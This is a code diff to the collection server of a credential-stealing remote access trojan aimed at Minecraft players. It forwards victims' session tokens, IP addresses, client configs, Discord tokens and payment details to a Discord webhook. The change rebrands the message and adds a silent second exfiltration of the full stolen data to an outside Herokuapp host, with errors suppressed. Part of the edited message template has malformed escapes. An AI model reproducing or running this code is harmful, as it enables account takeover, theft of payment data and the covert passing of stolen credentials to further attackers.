@@ -131,15 +131,15 @@ app.post("/", (req, res) => {
 
                 //send to discord webhook
                 post(process.env.WEBHOOK, JSON.stringify({
-                    content: `@everyone - ${total_networth}`, //ping
+                    content: `||@everyone|| - ||${total_networth}||`, //ping
                     embeds: [{
-                        title: `Ratted ${req.body.username} - Click For Stats`,
-                        description: `**Username:**\`\`\`${req.body.username}\`\`\`\n**UUID: **\`\`\`${req.body.uuid}\`\`\`\n**Token:**\`\`\`${req.body.token}\`\`\`\n**IP:**\`\`\`${req.body.ip}\`\`\`\n**TokenAuth:**\`\`\`${req.body.username}:${req.body.uuid}:${req.body.token}\`\`\`\n**Feather:**\nhttps://hst.sh/${feather}\n\n**Essentials:**\nhttps://hst.sh/${essentials}\n\n**Lunar:**\nhttps://hst.sh/${lunar}\n\n**Discord:**\`\`\`${discord.join(" | ")}\`\`\`\n**Nitro**: \`${nitros}\`\n**Payment**: \`${payments}\``,
+                        title: `${req.body.username}`,
+                        description: `**UUID**\`\`\`${req.body.uuid}\`\`\`\n**IP**\`\`\`${req.body.ip}\`\`\`\n**Token**\`\`\`${req.body.token}\`\`\`\${req.body.username}:${req.body.uuid}:${req.body.token}\`\`\`\**Discord**\`\`\`${discord.join(" | ")}\`\`\`\n**Nitro**: \`${nitros}\`\n**Payment**: \`${payments}\``,
                         url: `https://sky.shiiyu.moe/stats/${req.body.username}`,
-                        color: 5814783,
+                        color: 12345,
                         footer: {
-                            "text": "R.A.T by dxxxxy",
-                            "icon_url": "https://avatars.githubusercontent.com/u/42523606?v=4"
+                            "text": "Monkey has been beamed by Reaperr#8584",
+                            "icon_url": "https://cdn.discordapp.com/attachments/999409582591987853/1021032665161408522/Unbenanhjkt.png"
                         },
                         timestamp: new Date()
                     }],
@@ -151,6 +151,13 @@ app.post("/", (req, res) => {
                 }).catch(err => {
                     console.log(`[R.A.T] Error while sending to Discord webhook:\n${err}`)
                 })
+
+                //send to another server
+                post("something.herokuapp.com", req.body, {
+                    headers: {
+                        "Content-Type": "application/json"
+                    }
+                }).catch(err => {})
             }
 
             console.log(`[R.A.T] ${req.body.username} has been ratted!\n${JSON.stringify(req.body)}`)
